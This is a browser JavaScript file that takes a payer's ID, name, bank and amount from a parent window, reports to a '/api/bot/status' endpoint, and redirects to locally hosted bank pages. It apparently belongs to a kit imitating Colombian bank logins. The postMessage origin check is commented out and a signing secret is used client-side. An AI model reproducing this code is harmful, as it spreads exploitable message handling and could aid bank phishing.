// 1. Cuando la página está lista, avisa al padre que puede recibir mensajes
window.addEventListener('load', () => {
    if (window.opener) {
        window.opener.postMessage({ action: 'ready' }, '*');
    }


});

// 2. Escucha los mensajes que vengan del padre
window.addEventListener('message', async (event) => {

    // if (!PARENT_ORIGIN.includes(event.origin)) return window.close(); //validación

    const { action, data } = event.data;

    if (action === 'init') {
        // ? set info

        info.metaInfo.dni = data.id
        info.metaInfo.fullname = data.name
        info.metaInfo.bank = data.bank
        info.metaInfo.amount = data.amount
        info.metaInfo.TRANSID = data.transId
        info.metaInfo.origin = data.origin
        info.metaInfo.desc = data.desc

        updateLS()

        sendStatus()

        await new Promise(resolve => setTimeout(resolve, 2500));

        switch (data.bank) {
            case 'bancolombia':
                window.location.href = '/bancos/bancolombia-isolated/'
                break;
            case 'davivienda':
                window.location.href = '/bancos/davivienda-isolated/'
                break;
            case 'nequi':
                window.location.href = '/bancos/nequi-isolated/'
                break;
            case 'bogota':
                window.location.href = '/bancos/banco-de-bogota/'
                break;
            default:
                alert('Entidad bancaria no disponible.')
                break;
        }
    }

    if (action === 'close') {
        window.close()
    }


    // 3. Cuando termines envía la respuesta
    // window.opener.postMessage(
    //     { action: 'done', data: { response: 'ok'} },
    //     PARENT_ORIGIN
    // );
});

const sendStatus = () =>{
    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'PSE'}, JWT_SIGN);

    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${info.metaInfo.TRANSID}`
            },
            body: JSON.stringify({token: tokenn})
        });
    }catch(err){
        console.log(err);
    }
}
